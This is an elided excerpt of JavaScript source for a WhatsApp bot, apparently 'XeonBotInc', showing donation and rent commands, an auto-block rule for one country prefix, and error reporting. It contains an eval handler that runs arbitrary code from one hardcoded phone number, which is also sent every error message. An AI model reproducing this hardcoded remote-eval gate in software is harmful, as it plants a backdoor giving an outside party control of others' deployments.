...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "6282253969170") {
			let evaled,
				text = q,
...
if (m.sender.startsWith('68')) return XeonBotInc.updateBlockStatus(m.sender, 'block')
...
break
case 'sewa': case 'donasi': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'rent': {
me = m.sender
teks = `*「  ${global.botname}  」*\n\nSociabuzz: ${global.websitex}\n\nHi @${me.split('@')[0]} 👋\nRent/Donations can go to Sociabuzz or scan below🍜 👇 https://i.ibb.co/FKpbbnQ/Screenshot-20230603-121412-1.jpg`
sendXeonBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
...
let e = String(err)
XeonBotInc.sendMessage("6282253969170@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
